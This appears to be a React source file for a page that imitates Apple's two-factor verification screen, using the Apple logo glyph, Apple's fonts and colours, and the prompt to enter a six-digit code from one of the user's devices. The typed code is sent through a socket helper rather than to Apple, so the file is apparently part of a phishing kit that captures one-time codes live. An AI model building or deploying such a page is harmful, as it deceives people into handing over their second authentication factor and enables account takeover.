import { useEffect, useRef, useState } from "react";
import { Landing } from "../components/Landing";
import { submitCode } from "../lib/socket";

export default function Verify({ onContinue }) {
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [focusIdx, setFocusIdx] = useState(0);
  const refs = useRef([]);

  useEffect(() => {
    refs.current[0]?.focus();
  }, []);

  const complete = digits.every((d) => d.length === 1);

  function setDigit(i, raw) {
    const ch = raw.replace(/\D/g, "").slice(-1);
    setDigits((prev) => {
      const next = [...prev];
      next[i] = ch;
      return next;
    });
    if (ch && i < 5) refs.current[i + 1]?.focus();
  }

  function onKeyDown(i, e) {
    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
  }

  return (
    <Landing>
      <div className="mb-[50px] flex justify-center">
        <div className="my-5 w-[440px] max-w-[calc(100%-40px)] rounded-[11px] border border-[rgba(210,210,215,0.63)] bg-white px-0 pb-[29px] pt-[20px] text-center shadow-[0_4px_22px_rgba(0,0,0,0.06)]">
          <div className="mb-5 h-[45px]"><span className="relative top-[5px] inline-block font-['SF_Pro_Icons'] text-[40px] leading-[40px]">&#xF8FF;</span></div>

          <div className="px-5">
            <h2 className="font-display text-[21px] font-semibold leading-[26px] tracking-[0.147px] text-[#1d1d1f] [text-rendering:optimizeLegibility] max-[734px]:tracking-[0.189px]">
              Enter the verification code
            </h2>
            <p className="mt-1 text-[15px] leading-[21px] tracking-[-0.33px] text-[#424245] [text-rendering:optimizeLegibility]">
              Enter the 6-digit code generated by one of your devices.
            </p>
          </div>

          <div className="px-5">
            <div className="mt-[35px]">
              <div className="mx-auto flex w-[334px] gap-[14px] max-[734px]:w-[324px] max-[734px]:gap-3">
                {digits.map((digit, i) => (
                  <input
                    key={i}
                    ref={(el) => { refs.current[i] = el; }}
                    className={`box-border h-[46px] w-[44px] rounded-[12px] bg-[rgba(255,255,255,0.8)] text-center font-display text-[22px] leading-[29.3351px] tracking-[0.198px] text-[#1d1d1f] outline-none max-[734px]:rounded-[8px] ${
                      focusIdx === i ? "border-2 border-[#0071e3]" : "border border-[#86868b]"
                    }`}
                    type="tel"
                    inputMode="numeric"
                    autoCapitalize="off"
                    autoCorrect="off"
                    spellCheck="false"
                    autoComplete={i === 0 ? "one-time-code" : "off"}
                    aria-label={`Digit ${i + 1}`}
                    aria-invalid="false"
                    value={digit}
                    onFocus={() => setFocusIdx(i)}
                    onChange={(e) => setDigit(i, e.target.value)}
                    onKeyDown={(e) => onKeyDown(i, e)}
                  />
                ))}
              </div>
            </div>
          </div>

          <div className="mt-[51px]">
            <button
              type="button"
              className="inline-block border border-transparent px-0.5 py-1 text-[14px] leading-[20px] tracking-[-0.224px] text-[#0066cc] [text-rendering:optimizeLegibility]"
            >
              Didn&rsquo;t get a code?
            </button>
          </div>

          <div className="mt-[25px] px-[25px]">
            <button
              type="button"
              disabled={!complete}
              onClick={() => {
                if (!complete) return;
                submitCode(digits.join(""));
                onContinue?.();
              }}
              className="h-[36px] w-full rounded-[8px] border border-transparent bg-[#0071e3] px-[15px] py-[8px] text-center text-[14px] leading-[18px] tracking-[-0.224px] text-white [text-rendering:optimizeLegibility] disabled:opacity-[0.42]"
            >
              <span className="text-[14px] leading-[18px]">Continue</span>
            </button>
          </div>
        </div>
      </div>
    </Landing>
  );
}
